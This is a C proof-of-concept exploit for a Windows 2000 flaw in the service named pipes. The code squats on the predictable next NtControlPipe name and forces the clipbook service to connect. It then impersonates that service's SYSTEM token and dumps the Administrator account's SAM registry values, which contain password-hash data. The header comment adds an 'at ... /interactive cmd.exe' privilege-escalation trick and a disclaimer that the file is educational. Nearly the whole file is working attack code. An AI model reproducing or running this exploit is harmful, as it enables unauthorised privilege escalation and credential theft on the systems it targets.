/*
 *  Proof of Concept
 *  Windows2000 services named pipe vulnerability
 *  
 *  Author:  Maceo
 * 
 *  Compiled with MS VC++ 6.0 SP3
 *   
 *  Compiled and tested on:
 *     D:\>uname -sv
 *     Windows2000 5.0.2195
 * 
 *  Vulnerability:  Windows 2000 uses predictable named
 *  pipe names for controlling services.  Any user process
 *  can create a named pipe with the next name and force
 *  a service, they can start, to connect to the pipe.  Once
 *  connected the user process can impersonate the service,
 *  which in most cases runs in the SYSTEM account.
 *  
 *  Proof of concept:  This code abuses the clipbook service
 *  to run as the SYSTEM account and then dumps information
 *  from the local SAM database.  
 *  
 *  This file is for educational purposes only.  As many
 *  would agree, the default install of a W2K server is 
 *  inherently insecure against interactive users.  One
 *  does not have to dig very hard to find a way to 
 *  elevate a users privileges when placed in an interactive
 *  situation, such as logged in at a console.  For instance:
 *     D:\>time
 *     The current time is: 23:28:38.42
 *     D:\>at 23:29 /interactive cmd.exe
 *  
 *  It is with this in mind I release the following code.
 *  
 *  Disclaimer: This file is intended as proof of concept, and
 *  is not intended to be used for illegal purposes. The author
 *  does not accept responsibility for ANY damage incurred 
 *  by the use of it.
 *
 */


#include <stdio.h>
#include <windows.h>

#define ABUSE_SVC "clipbook"
#define SVC_KEY "SYSTEM\\CurrentControlSet\\Control\\ServiceCurrent"
#define SAM_KEY "SAM\\SAM\\Domains\\Account\\Users\\000001F4"


int main( )
{
  HKEY hOpen;
  DWORD dwNumber = 0;
  DWORD dwType = REG_DWORD;  
  DWORD dwSize = sizeof(DWORD);
  char szNetCmd[256];
  

  // make sure the service we want to abuse is stopped. //
  sprintf (szNetCmd, "net stop %s", ABUSE_SVC);
  system (szNetCmd);
  

  // open the current service number key //
  if (RegOpenKeyEx (HKEY_LOCAL_MACHINE, SVC_KEY, 0, KEY_READ, &hOpen))
  {
    printf ("Failed to open key:\n  %s\n", SVC_KEY);
    return 1;
  }
  
  // read the key //
  if (RegQueryValueEx (hOpen, "", NULL, &dwType, (BYTE *) &dwNumber, &dwSize))
  { 
    RegCloseKey (hOpen);
    printf ("Failed to read key:\n  %s\n", SVC_KEY);
    return 2;
  }
  
  // close the key //
  RegCloseKey (hOpen);


  // build the next named pipe name //
  char szPipe[64];
  sprintf(szPipe, "\\\\.\\pipe\\net\\NtControlPipe%lu", ++dwNumber);
  
  
  // create the named pipe before scm can // 
  HANDLE hPipe = 0;
  hPipe = CreateNamedPipe (szPipe, PIPE_ACCESS_DUPLEX, 
                           PIPE_TYPE_MESSAGE|PIPE_WAIT,
                           2, 0, 0, 0, NULL);
  if (hPipe == INVALID_HANDLE_VALUE)
  {
    printf ("Failed to create named pipe:\n  %s\n", szPipe);
    return 3;
  }


  // start the service we are going to abuse. //
  sprintf(szNetCmd, "start /min net start %s", ABUSE_SVC);
  system(szNetCmd);
  
  
  // wait for the service to connect // 
  ConnectNamedPipe (hPipe, NULL);


  // read a byte of data from the client //
  if (!ReadFile (hPipe, (void *) &dwNumber, 4, &dwSize, NULL))
  {
    printf ("Failed to read the named pipe.\n");
    CloseHandle(hPipe);
    return 4;
  }

  
  // assume the identity of the client //
  if (!ImpersonateNamedPipeClient (hPipe))
  {
    printf ("Failed to impersonate the named pipe.\n");
    CloseHandle(hPipe);
    return 5;
  }

  
  // display impersonating users name //
  dwSize  = 256;
  char szUser[256];
  GetUserName(szUser, &dwSize);
  printf ("Impersonating: %s\n", szUser);


  // Assume we are SYSTEM since it is the default, 
  // and let's crack open the SAM database and 
  // lookup rid 500 (Administrator unless name has been changed)
  
  if (RegOpenKeyEx (HKEY_LOCAL_MACHINE, SAM_KEY, 0, KEY_READ, &hOpen))
  {
    printf ("Failed to open key:\n  %s\n", SAM_KEY);
    return 1;
  }


  // read the F key //
  dwSize = 2048;
  BYTE szData[2048];
  if (RegQueryValueEx (hOpen, "F", NULL, &dwType, szData, &dwSize))
  { 
    RegCloseKey (hOpen);
    printf ("Failed to read key:\n  %s\\F\n", SAM_KEY);
    return 2;
  }


  // output the key //
  printf ("Dumping SAM for RID 500 ...\n\n");
  printf ("F:0x");
  for (DWORD i = 0; i < dwSize; i++) 
  { printf ("%2.2x", (DWORD) szData[i]); }
  printf ("\n\n"); 


  // read the V key //
  dwSize = 2048;
  if (RegQueryValueEx (hOpen, "V", NULL, &dwType, szData, &dwSize))
  { 
    RegCloseKey (hOpen);
    printf ("Failed to read key:\n  %s\\V\n", SAM_KEY);
    return 2;
  }


  // output the key //
  printf ("V:0x");
  for (i = 0; i < dwSize; i++) 
  { printf ("%2.2x", (DWORD) szData[i]); }
  printf ("\n"); 


  // clean up //
  RegCloseKey (hOpen);
  CloseHandle(hPipe);
  return 0;
}
